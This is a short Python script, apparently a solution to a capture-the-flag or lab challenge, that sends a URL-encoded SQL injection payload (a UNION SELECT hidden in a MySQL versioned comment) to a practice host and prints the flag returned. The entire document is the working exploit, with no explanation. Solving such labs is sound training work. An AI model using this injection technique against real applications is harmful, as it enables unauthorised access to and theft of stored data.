import requests

BASE_URL = f"https://inst-qt8bc9ap7e.web.vuln.si"

urlQuery =f"{BASE_URL}/?q=a%27+%2F*%21+UNION+SELECT+secret+FROM+flag*%2F+--+-"

r = requests.get(urlQuery)

print(r.text)
